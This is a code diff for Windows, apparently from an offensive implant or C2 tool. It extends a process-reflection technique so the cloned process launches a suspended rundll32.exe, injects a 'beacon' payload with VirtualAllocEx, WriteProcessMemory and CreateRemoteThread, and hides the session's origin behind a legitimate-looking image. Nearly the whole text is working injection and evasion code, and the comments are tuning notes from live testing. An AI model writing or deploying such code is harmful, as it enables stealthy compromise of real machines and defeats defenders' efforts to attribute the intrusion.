@@ -261,19 +261,73 @@ typedef NTSTATUS(NTAPI *fRtlCreateProcessReflection)(void *, unsigned long, void
  * remote threads, no inherited-runtime poisoning, identical image. */
 typedef struct {
 	volatile LONG go;
-	char * entry;
-	void * param;
+	char * payload;   /* dll bytes already mirrored into the clone (RX) */
+	int    plen;
+	void * param;     /* parameter blob already mirrored (RW) */
+	int    plen_arg;
 } DV_MAILBOX;
 
 static DV_MAILBOX dv_mailbox = { 0, NULL, NULL };
 static HANDLE dv_clone_handle = NULL;
 static DWORD  dv_clone_pid = 0;
 
+/* runs INSIDE the clone. kernel32 only - the cloned runtime's state is
+ * a torn snapshot (heap locks, RPC bindings mid-flight); a full beacon
+ * payload dies here in RPCRT4 on its first RPC touch (live, twice). The
+ * public PoC's shellcode spawns a child for exactly this reason: the
+ * clone acts as the LAUNCHER - fresh suspended host, mirror the payload,
+ * CreateRemoteThread. The new session comes from the healthy host while
+ * every process/thread record inside the clone points at our own
+ * legitimate image. */
+static void dv_clone_launch(char * payload, int plen, void * param, int plen_arg) {
+	STARTUPINFOA        si;
+	PROCESS_INFORMATION pi;
+	void *              remote = NULL;
+	void *              rparam = NULL;
+	SIZE_T              got = 0;
+	DWORD               oldp = 0;
+
+	ZeroMemory(&si, sizeof(si));
+	si.cb = sizeof(si);
+	ZeroMemory(&pi, sizeof(pi));
+
+	if (!CreateProcessA(NULL, (LPSTR)"rundll32.exe", NULL, NULL, FALSE,
+	                    CREATE_SUSPENDED, NULL, NULL, &si, &pi))
+		return;
+
+	remote = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen,
+	                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+	if (remote == NULL || !WriteProcessMemory(pi.hProcess, remote, payload, (SIZE_T)plen, &got) || got != (SIZE_T)plen)
+		goto done;
+	VirtualProtectEx(pi.hProcess, remote, (SIZE_T)plen, PAGE_EXECUTE_READ, &oldp);
+
+	if (plen_arg > 0) {
+		rparam = VirtualAllocEx(pi.hProcess, NULL, (SIZE_T)plen_arg,
+		                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+		if (rparam != NULL)
+			WriteProcessMemory(pi.hProcess, rparam, param, (SIZE_T)plen_arg, &got);
+	}
+
+	{
+		HANDLE ht = CreateRemoteThread(pi.hProcess, NULL, 0,
+		                               (LPTHREAD_START_ROUTINE)remote, rparam, 0, NULL);
+		if (ht != NULL)
+			CloseHandle(ht);
+	}
+
+done:
+	/* the host's never-started main thread stays suspended; the injected
+	 * beacon owns the process from here */
+	CloseHandle(pi.hProcess);
+	CloseHandle(pi.hThread);
+}
+
 void dv_nursery_trampoline(void * unused) {
 	(void)unused;
 	while (!dv_mailbox.go)
 		Sleep(200);
-	((void (*)(void *))dv_mailbox.entry)(dv_mailbox.param);
+	dv_clone_launch(dv_mailbox.payload, dv_mailbox.plen,
+	                dv_mailbox.param, dv_mailbox.plen_arg);
 	for (;;)
 		Sleep(60000);
 }
